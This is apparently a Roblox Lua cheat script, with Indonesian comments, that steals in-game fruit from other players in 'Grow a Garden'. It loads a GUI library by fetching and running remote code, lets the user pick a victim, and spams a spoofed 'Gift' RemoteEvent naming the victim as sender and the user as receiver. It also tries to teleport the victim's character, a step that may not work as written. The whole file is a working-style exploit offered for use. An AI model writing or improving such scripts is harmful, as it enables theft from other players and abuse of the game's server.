-- Load GUI Rayfield
local Rayfield = loadstring(game:HttpGet("https://raw.githubusercontent.com/shlexware/Rayfield/main/source"))()

local Window = Rayfield:CreateWindow({
    Name = "Grow a Garden - Fruit Stealer",
    LoadingTitle = "Loading...",
    ConfigurationSaving = {
        Enabled = false
    }
})

local SelectedPlayer = nil

-- Tab
local MainTab = Window:CreateTab("Fruit Stealer", 4483362458)

-- Pilih player
MainTab:CreateDropdown({
    Name = "Pilih Target Player",
    Options = {},
    CurrentOption = "",
    Flag = "SelectedTarget",
    Callback = function(Value)
        SelectedPlayer = Value
    end
})

-- Tombol STEAL
MainTab:CreateButton({
    Name = "STEAL Buah dari Player!",
    Callback = function()
        if not SelectedPlayer then
            Rayfield:Notify({
                Title = "Player Kosong",
                Content = "Pilih target player dulu!",
                Duration = 3
            })
            return
        end

        local Target = game.Players:FindFirstChild(SelectedPlayer)
        if not Target then
            Rayfield:Notify({
                Title = "Player Tidak Ditemukan",
                Content = "Mungkin player sudah keluar.",
                Duration = 3
            })
            return
        end

        local Remote = game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvent")

        -- Langkah 1: Teleport player target ke kita (paksa posisi server)
        pcall(function()
            Target.Character:MoveTo(game.Players.LocalPlayer.Character.HumanoidRootPart.Position)
        end)

        -- Langkah 2: Spam gift semua buah dari backpack-nya
        local function stealAllFruit()
            for i = 1, 10 do -- Spam 10x (bisa ditambah)
                Remote:FireServer({
                    ["Type"] = "Gift",
                    ["Data"] = {
                        ["Type"] = "Fruit",
                        ["Receiver"] = game.Players.LocalPlayer,
                        ["Sender"] = Target
                    }
                })
                task.wait(0.1)
            end
        end

        stealAllFruit()

        Rayfield:Notify({
            Title = "Sukses?",
            Content = "Request steal buah sudah dikirim. Cek backpack kamu.",
            Duration = 3
        })
    end
})

-- Update daftar player terus-menerus
task.spawn(function()
    while task.wait(2) do
        local list = {}
        for _, plr in pairs(game.Players:GetPlayers()) do
            if plr ~= game.Players.LocalPlayer then
                table.insert(list, plr.Name)
            end
        end
        MainTab.Flags["SelectedTarget"]:SetOptions(list)
    end
end)
